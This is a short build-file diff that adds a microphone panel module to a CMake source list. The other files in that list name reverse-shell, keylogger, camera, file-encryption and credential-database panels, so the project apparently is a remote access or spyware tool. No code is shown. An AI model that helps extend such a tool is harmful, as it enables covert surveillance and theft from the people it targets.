@@ -20,6 +20,7 @@ set(SRCS main.cpp
          file_encryption.cpp
          panel_process_manager.cpp
          panel_reverse_shell.cpp
+         panel_microfono.cpp
          panel_keylogger.cpp
          panel_camara.cpp
          frame_crypt_db.cpp
